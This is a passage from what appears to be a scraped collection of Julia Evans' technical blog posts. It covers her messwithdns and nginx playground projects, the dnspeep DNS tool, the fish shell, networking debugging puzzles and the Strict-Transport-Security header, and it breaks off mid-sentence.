exactly why\ninitially. \n\n Then I implemented Github OAuth, but that felt kind of bad too – logging in adds\nfriction! Not everyone has a GitHub account! \n\n Eventually I chatted with Kamal about it and we decided I was concerned about 3 things: \n\n \n Accidental collisions where 2 people get assigned the same subdomain and get confused \n People trying to create phishing subdomains \n I wanted people to get short, easy-to-type in domains \n \n\n So I wrote a simple  login function  that: \n\n \n Generates a random subdomain like  ocean8  that’s never been used before \n Saves  ocean8  to a database table so nobody else can take it \n Sends a secure cookie to the client (using  gorilla/securecookie ) \n Then the user (you!) can make any changes you want to  ocean8.messwithdns.com . \n \n\n Also the website’s domain ( https://messwithdns.net )\nis hosted on a different domain entirely than the domain where users can set\nrecords (which is  https://messwithdns.com ). So that means that if someone somehow does set a record on  messwithdns.com  at least it won’t take the site down. \n\n some static IP addresses \n\n One more quick note about the experiments: I wanted to have some IP addresses people could use in their experiment if they\nwanted. So I set up two static IPv4 addresses:  orange.jvns.ca \nand  purple.jvns.ca . They show a picture of an orange and some\ngrapes respectively, so you can easily see which is which. \n\n It’s important that each one has a dedicated IP address because they’ll be\naccessed using a bunch of different domains, so I couldn’t use the domain name\nto decide how to route the request. \n\n that’s all \n\n I hope this project helps some of you understand DNS better, and I’d love to\nhear about any problems you run into. Again, the site is at\n https://messwithdns.net  and you can report problems  on GitHub . \n\n"},
{"url": "https://jvns.ca/blog/2021/09/24/new-tool--an-nginx-playground/", "title": "New tool: an nginx playground", "content": "\n     \n\n Hello! On Wednesday I was talking to a friend about how it would be cool to\nhave an nginx playground website where you can just paste in an nginx config\nand test it out. And then I realized it might actually be pretty easy to build,\nso got excited and started coding and I built it. It’s at\n https://nginx-playground.wizardzines.com  and the source is at  github.com/jvns/nginx-playground . \n\n Here’s a screenshot: \n\n \n\n For the rest of the post I’m mostly going to talk about how I built the\nproject, because there were a few decisions that weren’t obvious to me. \n\n how to use it \n\n You need to enter both an nginx config and a  curl  or  http  command to make a\nHTTP request to that nginx instance \n\n And then you click “Run” in the top right, and it’ll output either: \n\n \n the results of the command you executed (if nginx started successfully), or \n the nginx error logs (if nginx failed to start) \n \n\n why a playground? \n\n I find that playgrounds really help me learn – it’s incredibly useful to be\nable to quickly and safely experiment and try out different options without\nworrying that Something Terrible is going to happen if you make a mistake. \n\n And nginx in particular is EXTREMELY finicky to configure, so I think it’s\nextra important to have a playground for nginx to quickly test things out. \n\n Here are 3 playgrounds I’ve made in the past: \n\n \n SQL playground , which uses  sql.js  to let you run arbitrary SQLite queries on some small example data \n CSS examples , which uses  codepen  to show some examples of surprising CSS behaviour that you can play with \n DNS lookup , which makes DNS queries to any website you want \n \n\n and a few other great playgrounds that others have made: \n\n \n CodePen  for CSS/JS/HTML \n regexr  for regular expressions \n db-fiddle  for SQL \n this  nginx location match tester  that reimplements nginx’s location matching in typescript \n \n\n building it quickly by keeping it simple \n\n This site has \n\n \n a static frontend (using vue.js and tailwind, my usual frontend stack) \n a Go backend with a single API endpoint that just does 1 thing (run an nginx config) \n \n\n This made pretty easy to build the project quickly (I just needed to write 1\nbackend endpoint and then a frontend that uses that endpoint!). This is also\nhow the  dns lookup  tool I made works – I like this\napproach a lot and I think I’ll do other projects in the same way. \n\n Let’s talk about what that backend code does when the frontend makes a request\nto it! \n\n what happens when you make a request \n\n Here’s what the Go backend does when you click ‘run’: (also here’s a  gist with the code right now ) \n\n \n write the config to a temp file \n create a new network namespace ( ip netns add $RANDOM_NAMESPACE_NAME ) \n start  go-httpbin  on port 777 so that people can use that as a backend in their nginx configs \n start nginx \n wait 100ms to make sure nginx started, if it failed then return nginx’s error logs to the client \n run the command that the user requested (and make sure that the command starts with  curl  or  http ) \n return the command’s output \n done \n \n\n the security problem \n\n The whole point of the tool is to let people run arbitrary nginx\nconfigurations, and it’s easy to imagine how that could result in the server\nbeing compromised. But I wanted run the service for free and not spend a lot of\nmoney on hosting. So I wanted to just use 1 shared server for all requests. \n\n This kind of thing often stops me from doing projects like this, but this one\nfelt a little more tractable to me. \n\n the security approach: a little bit of isolation, a little bit of YOLO \n\n Here’s how I decided to approach the security to start, after talking to a friend about it: \n\n \n Host the frontend on a CDN, separately from the backend (so that if the backend gets compromised nobody can serve malware from the frontend) \n Don’t use a database, just browser local storage (can’t hack the database if there isn’t one!) \n Put every nginx in its own network namespace, don’t let it connect to the internet \n Use fly.io’s free tier (so it’s isolated on its own VM, as far as I know it doesn’t have\naccess to anything sensitive, and I can potentially destroy and redeploy the\nVM every hour if I want to) \n Ask people to be nice in the FAQ (that’s the “YOLO” part :) ) \n \n\n I think that with these constraints, the only bad things that could happen are: \n\n a. Someone gets access to the test nginx configs of other people using the website at the same time\nb. Someone replaces the backend API server so that it returns some sort of malicious or offensive output.\nc. Someone tries to mine bitcoin on the tiny instance it’s running on (1 shared CPU, 256 MB RAM) \n\n I don’t think any of those are thaaaat harmful in the grand scheme of things,\nthough it’s possible I’m missing something. Someone already showed how to read\nthe  /etc/passwd  file which is fun, but there’s nothing sensitive in\nthere. \n\n I might switch to running each nginx in a container later instead of just\nrunning it in a network namespace, but I didn’t do it initially because I\nthought it might be too slow – it’s already a bit slow. \n\n Speaking about slow, let’s talk about performance. \n\n some notes on performance \n\n Like I mentioned before, this backend is running on a pretty small instance\n(1 shared CPU, 256 MB RAM). Here are some quick notes on that: \n\n \n the frontend runs on a CDN, so the backend only gets used when someone\nactually executes an nginx config. That takes a lot of pressure off the tiny backend. \n According to the server logs, each request seems to take about 400ms right now. That’s\nnot too bad! \n It’s running on a server in Toronto right now, so I guess it’s be slower\nfor people far away from Toronto. I could fix that by running more fly\nservers in more locations though. \n I used a Go clone of  httpbin  instead of the original\nPython version, since I figured the Go version would be lighter weight \n The frontend performance isn’t great – the CSS and JS is all in separate\nfiles. I didn’t want to use an  npm build  step to combine them because I’m\npretty bad at Javascript and I’m always worried my Javascript build will\nbreak and then I’ll be too lazy to fix it and then it’ll be impossible for\nme to deploy changes. \n I added a little rocket ship gif that plays while the backend is running to\nmake it a little more fun to wait \n \n\n The silliest performance problem I had was that I was originally stopping the\nnginx worker processes by sending them a SIGKILL signal. But that killed just\nthe main process and not the worker processes, so then I was leaking nginx\nworker processes, which eventually made the instance run out of memory. Sending\nnginx processes a  SIGTERM  instead made it shut down everything correctly and\nfixed that problem. \n\n the design \n\n The design basically just copies  jsfiddle  and  codepen . \n\n In particular JSFiddle does a nice simple thing where it calculates the height\nof the main area as  calc(100vh - 60px)  and the header has height  60px . I\nwouldn’t have thought of that on my own but it seems to work really well. \n\n I used  CodeMirror  for syntax highlighting because\nthat’s what jsfiddle and codepen both seem to do, it was super easy to set up,\nand it turns out it even has an  nginx  and a  shell  mode! It’s everything I\ncould have dreamed of :) \n\n The main hiccup with CodeMirror was that I initially wanted to use a  vue-codemirror \nintegration and there wasn’t one for Vue 3, but I decided that it was\nunnecessary and just wrote my own tiny integration that updates Vue when\nthe textbox is updated. (basically just  this.nginx_codemirror.on('change', cm => this.nginx_config = cm.getValue()) ) \n\n You can see the Javascript code at  script.js  but there’s\nreally not a lot of it. \n\n still to do: add more example nginx configs \n\n I’m still not quite sure what the examples should be, but I think I want to\nprovide a few more template nginx configs to use as starting points. \n\n this was easier to build than I thought \n\n This was a lot easier to build than I thought it would be! It makes me want to\nbuild playgrounds for other programs too, though I’m not sure which one would\nbe next. HAProxy seems like an obvious similar choice. \n\n"},
{"url": "https://jvns.ca/blog/2021/03/31/dnspeep-tool/", "title": "A tool to spy on your DNS queries: dnspeep", "content": "\n     \n\n Hello! Over the last few days I made a little tool called  dnspeep  that lets\nyou see what DNS queries your computer is making, and what responses it’s getting. It’s about  250 lines of Rust right now . \n\n I’ll talk about how you can try it, what it’s for, why I made it, and some problems I ran into while writing it. \n\n how to try it \n\n I built some binaries so you can quickly try it out. \n\n For Linux (x86): \n\n wget https://github.com/jvns/dnspeep/releases/download/v0.1.0/dnspeep-linux.tar.gz\ntar -xf dnspeep-linux.tar.gz\nsudo ./dnspeep\n \n\n For Mac: \n\n wget https://github.com/jvns/dnspeep/releases/download/v0.1.0/dnspeep-macos.tar.gz\ntar -xf dnspeep-macos.tar.gz\nsudo ./dnspeep\n \n\n It needs to run as root because it needs access to all the DNS packets your computer is sending. This is the same reason  tcpdump  needs to run as root – it uses  libpcap  which is the same library that tcpdump uses. \n\n You can also read the source and build it yourself at\n https://github.com/jvns/dnspeep  if you don’t want to just download binaries and\nrun them as root :). \n\n what the output looks like \n\n Here’s what the output looks like. Each line is a DNS query and the response. \n\n $ sudo dnspeep\nquery   name                 server IP      response\nA       firefox.com          192.168.1.1    A: 44.235.246.155, A: 44.236.72.93, A: 44.236.48.31\nAAAA    firefox.com          192.168.1.1    NOERROR\nA       bolt.dropbox.com     192.168.1.1    CNAME: bolt.v.dropbox.com, A: 162.125.19.131\n \n\n Those queries are from me going to  neopets.com  in my browser, and the\n bolt.dropbox.com  query is because I’m running a Dropbox agent and I guess it phones\nhome behind the scenes from time to time because it needs to sync. \n\n why make another DNS tool? \n\n I made this because I think DNS can seem really mysterious when you don’t know\na lot about it! \n\n Your browser (and other software on your computer) is making DNS queries all\nthe time, and I think it makes it seem a lot more “real” when you can actually\nsee the queries and responses. \n\n I also wrote this to be used as a debugging tool. I think the question “is this a\nDNS problem?” is harder to answer than it should be – I get the impression that\nwhen trying to check if a problem is caused by DNS people often use trial and\nerror or guess instead of just looking at the DNS responses that their\ncomputer is getting. \n\n you can see which software is “secretly” using the Internet \n\n One thing I like about this tool is that it gives me a sense for what programs\non my computer are using the Internet! For example, I found out that something\non my computer is making requests to  ping.manjaro.org  from time to time\nfor some reason, probably to check I’m connected to the internet. \n\n A friend of mine actually discovered using this tool that he had some corporate\nmonitoring software installed on his computer from an old job that he’d\nforgotten to uninstall, so you might even find something you want to remove. \n\n tcpdump is confusing if you’re not used to it \n\n My first instinct when trying to show people the DNS queries their computer is\nmaking was to say “well, use tcpdump”! And  tcpdump  does parse DNS packets! \n\n For example, here’s what a DNS query for  incoming.telemetry.mozilla.org.  looks like: \n\n 11:36:38.973512 wlp3s0 Out IP 192.168.1.181.42281 > 192.168.1.1.53: 56271+ A? incoming.telemetry.mozilla.org. (48)\n11:36:38.996060 wlp3s0 In  IP 192.168.1.1.53 > 192.168.1.181.42281: 56271 3/0/0 CNAME telemetry-incoming.r53-2.services.mozilla.com., CNAME prod.data-ingestion.prod.dataops.mozgcp.net., A 35.244.247.133 (180)\n \n\n This is definitely possible to learn to read, for example let’s break down the query: \n\n 192.168.1.181.42281 > 192.168.1.1.53: 56271+ A? incoming.telemetry.mozilla.org. (48) \n\n \n A?  means it’s a DNS  query  of type A \n incoming.telemetry.mozilla.org.  is the name being queried \n 56271  is the DNS query’s ID \n 192.168.1.181.42281  is the source IP/port \n 192.168.1.1.53  is the destination IP/port \n (48)  is the length of the DNS packet \n \n\n And in the response breaks down like this: \n\n 56271 3/0/0 CNAME telemetry-incoming.r53-2.services.mozilla.com., CNAME prod.data-ingestion.prod.dataops.mozgcp.net., A 35.244.247.133 (180) \n\n \n 3/0/0  is the number of records in the response: 3 answers, 0 authority, 0 additional. I think tcpdump will only ever print out the answer responses though. \n CNAME telemetry-incoming.r53-2.services.mozilla.com ,   CNAME prod.data-ingestion.prod.dataops.mozgcp.net. , and  A 35.244.247.133  are the three answers \n 56271  is the responses ID, which matches up with the query’s ID. That’s how you can tell it’s a response to the request in the previous line. \n \n\n I think what makes this format the most difficult to deal with (as a human who\njust wants to look at some DNS traffic) though is that you have to manually\nmatch up the requests and responses, and they’re not always on adjacent lines.\nThat’s the kind of thing computers are good at! \n\n So I decided to write a little program ( dnspeep ) which would do this matching\nup and also remove some of the information I felt was extraneous. \n\n problems I ran into while writing it \n\n When writing this I ran into a few problems. \n\n \n I had to patch the  pcap  crate to make it work properly with Tokio on Mac OS ( this change ). This was one of those bugs which took many hours to figure out and 1 line to fix :) \n Different Linux distros seem to have different versions of  libpcap.so , so I couldn’t easily distribute a binary that dynamically links libpcap\n(you can see other people having the same problem  here ). So I decided\nto statically compile libpcap into the tool on Linux. I still don’t really\nknow how to do this properly in Rust, but I got it to work by copying the\n libpcap.a  file into  target/release/deps  and then just running  cargo build . \n The  dns_parser  crate I’m using doesn’t support all DNS query types, only\nthe most common ones. I probably need to switch to a different crate for\nparsing DNS packets but I haven’t found the right one yet. \n Becuase the  pcap  interface just gives you raw bytes (including the Ethernet frame), I needed to  write code to figure out how many bytes to strip from the beginning to get the packet’s IP header . I’m pretty sure there are some cases I’m still missing there. \n \n\n I also had a hard time naming it because there are SO MANY DNS tools already\n(dnsspy! dnssnoop! dnssniff! dnswatch!). I basically just looked at every\nsynonym for “spy” and then picked one that seemed fun and did not already have\na DNS tool attached to it. \n\n One thing this program doesn’t do is tell you which process made the DNS query,\nthere’s a tool called  dnssnoop  I found that does that.\nIt uses eBPF and it looks cool but I haven’t tried it. \n\n there are probably still lots of bugs \n\n I’ve only tested this briefly on Linux and Mac and I already know of at least\none bug (caused by not supporting enough DNS query types), so please report\nproblems you run into! \n\n The bugs aren’t dangerous though – because the libpcap interface is read-only\nthe worst thing that can happen is that it’ll get some input it doesn’t\nunderstand and print out an error or crash. \n\n writing small educational tools is fun \n\n I’ve been having a lot of fun writing small educational DNS tools recently. \n\n So far I’ve made: \n\n \n https://dns-lookup.jvns.ca  (a simple way to make DNS queries) \n https://dns-lookup.jvns.ca/trace.html  (shows you exactly what happens behind the scenes when you make a DNS query) \n this tool ( dnspeep ) \n \n\n Historically I’ve mostly tried to explain existing tools (like  dig  or\n tcpdump ) instead of writing my own tools, but often I find that the output of\nthose tools is confusing, so I’m interested in making more friendly ways to see\nthe same information so that everyone can understand what DNS queries their\ncomputer is making instead of just tcpdump wizards :). \n\n"},
{"url": "https://jvns.ca/blog/2017/04/23/the-fish-shell-is-awesome/", "title": "The fish shell is awesome", "content": "\n     \n\n 3 years ago, I switched from using bash or zsh to fish ( https://fishshell.com/ ). I like it so\nmuch that I wanted to write a blog post about why! There are a few\nfish features that mean that I’ll probably never switch back to bash. \n\n no configuration \n\n First – I know that zsh+oh-my-zsh is really awesome, and you can almost certainly configure\nzsh to do all everything I’m gonna describe in this post. The thing I like personally about fish is that I\ndon’t have to configure it! I just install it on all my computers, it\ncomes with a lot of awesome features out of the box, and I don’t need to\ndo any configuration. \n\n My fish configuration file literally just sets some environment\nvariables and that’s it. \n\n feature 1: autosuggestions \n\n This is the one true reason I adore fish, I don’t care about any other\nfeature nearly as much. \n\n The first amazing thing that fish does is  autocompletion from my shell\nhistory . As I type,\nit’ll automatically suggest (in light grey) a command that I ran\nrecently. I can press the right arrow key to accept the completion, or\nkeep typing to ignore it. \n\n Here’s what that looks like in practice: (in this example I just typed\nthe “v” key and it guessed that I want to run the previous vim command\nagain) \n\n \n \n \n \n \n\n This autocompletion is also  contextual . If I type ‘v’ in my home\ndirectory, it’ll just suggest  vim , but if I cd into  work/homepage \nand type  v , it’ll suggest the file I edited when I was in that\ndirectory. I LOVE that it takes the directory I’m in into account and it\nmeans that the autocompletions work so much better. \n\n The filename autocompletions are also smarter than in bash: I can type  ls 2017 , press tab, and it’ll autocomplete to  ls outreachy-flyer-2017-May.jpg . \n\n feature 2: really good syntax highlighting \n\n When I type a command that doesn’t exist, fish highlights it in red,\nlike this.  python4  gets highlighted in red, and  python3  in blue,\nbecause python3 is a real program on my system and python4 isn’t. \n\n \n \n \n \n \n\n This is nice and it helps me all the time to see when I make typos. \n\n feature 3: loops that are easier to use \n\n Did you see that for loop in that screen shot before? Yeah! \n\n for i in *.yaml\n  echo $i\nend\n \n\n It’s so READABLE. All the control flow statements just end with  end ,\nnot  done  or  fi  or  esac .\nAnd it actually has a usable editor for loops. I can use my arrow keys\nto go up to the first line and edit something if I made a mistake. \n\n You will also notice at this point that fish’s loops are real different\nfrom bash loops. bash/sh syntax really does not work inside fish. \n\n feature 4: no more ctrl+r \n\n This one isn’t so important but I still like it. \n\n I search my history all the time! For example, I never remember where my\nfish configuration is because it’s kind of in a weird spot. But I\nremember that it’s called config.fish so I just need to search for that. \n\n In bash to search your history, you use “ctrl+r” and then it says\n“reverse-i-search” for some reason and then you find your thing. In\nfish, here’s how it works \n\n \n type  config.fish \n press the up arrow.  vim ~/.config/fish/config.fish  appears \n right, that’s the file! Press enter. Done! \n \n\n This is not really so different than bash’s ctrl+r but for some\nreason it makes me happy that I can just press the up arrow any time to\nsearch my history. \n\n fish is great! maybe try it! \n\n some other random cool stuff about fish: \n\n \n it comes in with built in autocompletions for a lot of commands, you\ndon’t have to do anything special to install them \n also apparently it automatically generates completions by parsing man\npages? that’s so smart and amazing. I just learned that today! \n you can configure it from a web browser (:D :D). I don’t really\nconfigure my fish but I think this is cool because they’re like “hey,\nyou don’t have to learn our configuration language to make some basic\nchanges, just go to this webpage!“. It’s such a different approach! \n It has a  great 1-page tutorial  that walks you through all the basic features and the differences from other shells. \n \n\n fish isn’t POSIX compliant, and that still trips me up sometimes, it’s\nsimilar but just different enough that I sometimes get confused about\nhow to set environment variables. This doesn’t make me love fish any\nless, though! If I ever need to run a bash script or something I just\nswitch to bash for a couple minutes, it takes like 1 second to type\n bash  =) \n\n"},
{"url": "https://jvns.ca/blog/2021/04/16/notes-on-debugging-puzzles/", "title": "Notes on building debugging puzzles", "content": "\n     \n\n Hello! This week I started building some choose-your-own-adventure-style puzzles about\ndebugging networking problems. I’m pretty excited about it and I’m trying to organize my thoughts so here’s a blog post! \n\n The two I’ve made so far are: \n\n \n The Case of the Connection Timeout \n The Case of the Slow Website \n \n\n I’ll talk about how I came to this idea, design decisions I made, how it works,\nwhat I think is hard about making these puzzles, and some feedback I’ve gotten so far. \n\n why this choose-your-own-adventure format? \n\n I’ve been thinking a lot about DNS recently, and how to help people\ntroubleshoot their DNS issues. So on Tuesday I was sitting in a park with a\ncouple of friends chatting about this. \n\n We started out by talking about the idea of flowcharts (“here’s a flowchart\nthat will help you debug any DNS problem”). I’ve don’t think I’ve ever seen a\nflowchart that I found helpful in solving a problem, so I found it really hard\nto imagine creating one – there are so many possibilities! It’s hard to be\nexhaustive! It would be disappointing if the flowchart failed and didn’t give\nyou your answer! \n\n But then someone mentioned choose-your-own-adventure games, and I thought about\nsomething I  could  relate to – debugging a problem together with someone\nwho knows things that I don’t! \n\n So I thought – what if I made a choose-your-own-adventure game where you’re\ngiven the symptoms of a specific networking bug, and you have to figure out how\nto diagnose it? \n\n I got really excited about this and immediately went home and started putting\nsomething together in Twine. \n\n Here are some design decisions I’ve made so far. Some of them might change. \n\n design decision: the mystery has 1 specific bug \n\n Each mystery has one very specific bug, ideally a bug that I’ve actually run\ninto in the past. Your mission is to figure out the cause of the bug and fix\nit. \n\n design decision: show people the actual output of the tools they’re using \n\n All of the bugs I’m starting with are networking issues, and the way you solve\nthem is to use various tools (like dig, curl, tcpdump, ping, etc) to get more\ninformation. \n\n Originally I thought of writing the game like this: \n\n \n You choose “Use curl” \n It says “You run  <command> . You see that the output tells you  <interpretation> “ \n \n\n But I realized that immediately interpreting the output of a command for\nsomeone is extremely unrealistic – one of the biggest problems with using some\nof these command line networking tools is that their output is hard to interpret! \n\n So instead, the puzzle: \n\n \n Asks what tool you want to use \n Tells you what command they ran, and shows you the output of the command \n Asks you to interpret the output (you type it in in a freeform text box) \n Tells you the “correct” interpretation of the output and shows you how you\ncould have figured it out (by highlighting the relevant parts of the output) \n \n\n This really lines up with how I’ve learned about these tools in real life – I\ndon’t learn about how to read all of the output all at once, I learn it in bits\nand pieces by debugging real problems. \n\n design decision: make the output realistic \n\n This is sort of obvious, but in order to give someone output to help them\ndiagnose a bug, the output needs to be a realistic representation of what would\nactually happen. \n\n I’ve been doing this by reproducing the bug in a virtual machine (or on my\nlaptop), and then running the commands in the same way I would to fix the bug\nin real life and paste their output. \n\n Reproducing the bug isn’t always easy, but once I’ve reproduced it it\nmakes building the puzzle much more straightforward than trying to imagine what\ntcpdump would theoretically output in a given situation. \n\n design decision: let people collect “knowledge” throughout the mystery \n\n When I debug, I think about it as slowly collecting new pieces of information\nas I go. So in this mystery, every time you figure out a new piece of\ninformation, you get a little box that looks like this: \n\n \n\n And in the sidebar, you have a sort of “inventory” that lists all of the\nknowledge you’ve collected so far. It looks like this: \n\n \n\n design decision: you always figure out the bug \n\n My friend Sumana pointed out an interesting difference between this and normal\nchoose-your-own-adventure games: in the choose-your-own-adventure games I grew\nup reading, you lose a lot! You make the wrong choice, and you fall into a pit\nand die. \n\n But that’s not how debugging works in my experience. When debugging, if you\nmake a “wrong” choice (for example by making a guess about the bug that isn’t\ncorrect), there’s no cost except your time! So you can always go back, keep\ntrying, and eventually figure out what’s going on. \n\n I think that “you always win” is sort of realistic in the sense that with any bug you can always figure out what the bug is, given: \n\n \n enough time \n enough understanding of how the systems you’re debugging work \n tools that can give you information about what’s happening \n \n\n I’m still not sure if I want all bugs to result in “you fix the bug!” –\nsometimes bugs are impossible to fix if they’re caused by a system that’s\noutside of your control! One really interesting idea Sumana had was to have the\nresolution sometimes be to tell someone else (like your ISP) about the issue,\nwhich made me think about how it’s a useful skill to be able to write a really\nclear and convincing bug report so that the people with the ability to fix the\nbug will be able to easily recognize that you’ve accurately diagnosed the\nissue. \n\n design decision: include red herrings sometimes \n\n In debugging in real life, there are a lot of red herrings! Sometimes you see\nsomething that looks weird, and you spend three hours looking into it, and then\nyou realize that wasn’t it at all. \n\n One of the mysteries right now has a red herring, and the way I came up with it was\nthat I ran a command and I thought “wait, the output of that is pretty\nconfusing, it’s not clear how to interpret that”. So I just included the\nconfusing output in the mystery and said “hey, what do you think it means?”. \n\n One thing I like about including red herrings is that it lets me show how you\ncan prove what the cause of the bug  isn’t  which is even harder than proving\nwhat the cause of the bug is. \n\n design decision: use free form text boxes \n\n Here’s an example of what it looks like to be asked to interpret some output.\nYou’re asked a question and you fill in the answer in a text box. \n\n \n\n I think I like using free form text boxes instead of multiple choice because it\nfeels a little more realistic to me – in real life, when you see some output\nlike this, you don’t get a list of choices! \n\n design decision: don’t do anything with what you enter in the text box \n\n No matter what you enter in the text box (or if you say “I don’t know”),\nexactly the same thing happens. It’ll send you to a page that tells you the\nanswer and explains the reasoning. So you have to think about what you\nthink the answer might be, but if you get it “wrong”, it’s no big deal. \n\n The reason I’m doing this is basically “it’s very easy to implement”, but I\nthink there’s maybe also something nice about it for the person using it – if\nyou don’t know, it’s totally okay! You can learn something new and keep moving!\nYou don’t get penalized for your “wrong” answers in any way. \n\n design decision: the epilogue \n\n At the end of the game, there’s a very short epilogue where it talks about how\nlikely you are to run into this bug in real life / how realistic this is. I\nthink I need to expand on this to answer other questions people might have had\nwhile going through it, but I think it’s going to be a nice place to wrap up\nloose ends. \n\n how long each one takes to play: 5 minutes \n\n People seem to report so far that each mystery takes about 5 minutes to play,\nwhich feels reasonable to me. I think I’m most likely to extend this by making\nlots of different 5-minute mysteries rather than making one really long\nmystery, but we’ll see. \n\n what’s hard: reproducing the bug \n\n Figuring out how to reproduce a given bug is actually not that easy – I think\nI want to include some pretty weird bugs, and setting up a computer where that\nbug is happening in a realistic way isn’t actually that easy. I think this just\ntakes some work and creativity though. \n\n what’s hard: giving realistic options \n\n The most common critique I got was of the form “In this situation I would\nhave done X but you didn’t include X as an option”. Some examples of X: “ping the\nproblem host”, “ssh to the problem host and run tcpdump there”, “look at the\nlog file”, “use netstat”, etc. \n\n I think it’s possible to make a lot of progress on this with\nplaytesting – if I playtest a mystery with a bunch of people and ask them to\ntell me when there was an option they wish they had, I can add that option\npretty easily! \n\n Because I can actually reproduce the bug, providing an option like “run\nnetstat” is pretty straightforward – all I have to do is go to the VM where\nI’ve reproduced the bug, run  netstat , and put the output into the game. \n\n A couple of people also said that the game felt too “linear” or didn’t branch\nenough. I’m curious about whether that will naturally come out of having more\nrealistic options. \n\n how it works: it’s a Twine game! \n\n I felt like Twine was the obvious choice for this even though I’d never used it\nbefore – I’d heard so many good things about it over the years. \n\n You can see all of the source code for The Case of the Connection Timeout in  connection-timeout.twee  and  common.twee , which has some shared code between all the games. \n\n A few notes about using Twine: \n\n \n I’m using SugarCube, the  sugarcube docs are very good \n I’m using  tweego  to translate the  .twee  files in to a HTML page. I started out using the visual Twine editor to do my editing but switched to  tweego  pretty quickly because I wanted to use version control and have a more text-based workflow. \n The final output is one big HTML file that includes all the images and CSS and Javascript inline. The final HTML files are about 800K which seems reasonable to me. \n I base64-encode all the images in the game and include them inline in the file \n The  Twine wiki  and forums have a lot of great information and between the Twine wiki, the forums, and the Sugarcube docs I could pretty easily find answers to all my questions. \n \n\n I used pretty much the exact Twine workflow from Em Lazerwalker’s great post  A Modern Developer’s Workflow For Twine . \n\n I won’t explain how Twine works because it has great documentation and it would make this post way too long. \n\n some feedback so far \n\n I posted this on Twitter and asked for feedback. Some common pieces of feedback I got: \n\n things people liked: \n\n \n maybe 180 “I love this, this was so fun, I learned something new” \n A bunch of people specifically said that they liked learning how to interpret tcpdump’s output format \n A few people specifically mentioned that they liked the “what you know” list and the mechanic of hunting for clues and how it breaks down the debugging process. \n \n\n some suggestions for improvements: \n\n \n Like I mentioned before, lots of people said “I wanted to try X but it wasn’t an option” \n One of the puzzles had a resolution to the bug that some people found unsatisfying (they felt it was more of a workaround than a fix, which I agreed with). I updated it to add a different resolution that was more satisfying. \n There were some technical issues (it could be more mobile-friendly, one of the images was hard to read, I needed to add a “Submit” button to one of the forms) \n Right now the way the text boxes work is that no matter what you type, the exact same thing happens. Some people found this a bit confusing, like  “why did it act like I answered correctly if my answer was wrong”. This definitely needs some work. \n \n\n some goals of this project \n\n Here’s what I think the goals of this project are: \n\n \n help people learn about  tools  (like tcpdump, dig, and curl). How do you use each tool? What questions can they be used to answer? How do you interpret their output? \n help people learn about  bugs . There are some super common bugs that we run into over and over, and once you see a bug once it’s easier to recognize the same bug in the future. \n help people get better at the  debugging process  (gathering data, asking questions) \n \n\n what experience is this trying to imitate? \n\n Something I try to keep in mind with all my projects is – what real-life\nexperience does this reproduce? For example, I kind of think of my zines as\nbeing the experience “your coworker explains something to you in a really clear\nway”. \n\n I think the experience here might be “you’re debugging a problem together with\nyour coworker and they’re really knowledgeable about the tools you’re using”. \n\n that’s all! \n\n I’m pretty excited about this project right now – I’m going to build at least\na couple more of these and see how it goes! If things go well I might make this\ninto my first non-zine thing for sale – maybe it’ll be a collection of 12\nsmall debugging mysteries! We’ll see. \n\n"},
{"url": "https://jvns.ca/blog/2017/04/30/using-strict-transport-security/", "title": "Using the Strict-Transport-Security header", "content": "\n     \n\n I just updated my site today to use the  Strict-Transport-Security  (or\n“HSTS” as it’s often called) header, and I think it’s an interesting\nthing to know about so I thought I’d tell you all about it. \n\n Extra disclaimer for web security posts: I’m not a security\nperson, you should not take security advice from me, security is\ncomplicated. This is just what I understand so far! I think most of this\nis right but if it’s wrong let me know! \n\n HTTPS is good \n\n The idea behind the Strict-Transport-Security header is that if you\nhave a HTTPS site (like github.com), you might want your users to  always  use the HTTPS\nversion of your site. \n\n Until yesterday, my site had a HTTP version and an HTTPS version. So you\ncould go to  http://jvns.ca  or  https://jvns.ca , depending on what you\nwanted! This was fine, because my site is a static HTML site and there’s\nno private content on it at all. \n\n But a lot of sites  do  have private content, and should always use\nencryption! The standard practice if you always want your site to be\nserved with HTTPS is: \n\n \n Don’t serve a HTTP version of your site at all. Always redirect HTTP\nto HTTPS (run  curl -I http://github.com  to see that they do a\nredirect to HTTPS!) \n Force browsers to  never  visit the HTTP version (not even once!), using the HSTS\nheader and the “preload list”, which I’ll explain! \n \n\n As I understand it, there are 2 reasons it isn’t enough to  just  redirect HTTP -> HTTPS is: \n\n reason 1 : If I go to  http://github.com , by default my browser will send my GitHub\ncookies unencrypted, which is bad! Somebody could steal them! So it’s\nbetter if I never visit  http://github.com  at all, even if I type it in\nby accident or I click on a malicious link. You can also fix this by\nsetting the  secure  flag on a cookie, though, which means it’ll never\nbe sent over HTTP. \n\n reason 2 : If a sketchy free wifi portal starts serving a fake\n“github.com” site, then I don’t want my browser to be tricked. If my\nbrowser refuses to visit any HTTP version of github.com, ever, then I’m\nsafer. An evil ISP can’t inject ads / malware into my website! \n\n The Strict-Transport-Security header \n\n Strict-Transport-Security is also knows as “HTTP Strict Transport\nSecurity” or “HSTS”. I’ll use “HSTS” and “Strict-Transport-Security”\ninterchangeably. \n\n Let’s start with an example of how GitHub uses the\nStrict-Transport-Security header and then we’ll talk about what it\ndoes! \n\n First, if I try to go to  http://github.com , I just get a redirect to the\nHTTPS version of the site. Here’s what that looks like \n\n bork@kiwi~> curl -I http://github.com\nHTTP/1.1 301 Moved Permanently\nContent-length: 0\nLocation: https://github.com/\nConnection: close\n \n\n Next, when I visit  https://github.com , you can see that they return this\nheader called  Strict-Transport-Security \n\n bork@kiwi~> curl -I https://github.com\nHTTP/1.1 200 OK\nServer: GitHub.com\nDate: Sun, 30 Apr 2017 17:36:21 GMT\nContent-Type: text/html; charset=utf-8\nStatus: 200 OK\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\n(a bunch more stuff removed)\n \n\n So, what does this  Strict-Transport-Security  header mean?\n“Strict-Transport-Security” is a way to to tell browsers “hey, never\nvisit the HTTP version of this site ever”. \n\n So after I visit  https ://github.com one time in my browser, it will\nnever visit  http ://github.com again. If I write  http://github.com \nit’ll just pretend I wrote  https . \n\n The preload list \n\n Okay, so you set the Strict-Transport-Security header! That’s awesome,\nbut the first time someone tries to go to  http://github.com  they’ll still\nvisit the insecure version one time. \n\n So browsers do  another  thing called the “preload list”. The idea\nhere is that Chrome & Firefox will download a list of sites which should\nall use HTTPS. If a site is on the list. \n\n If you want to apply to have your site added to the list, you can do it\nat  https://hstspreload.org/ . You can see GitHub’s status at  https://hstspreload.org/?domain=github.com . (they’re on the list!) \n\n why did I turn it on? \n\n I put an 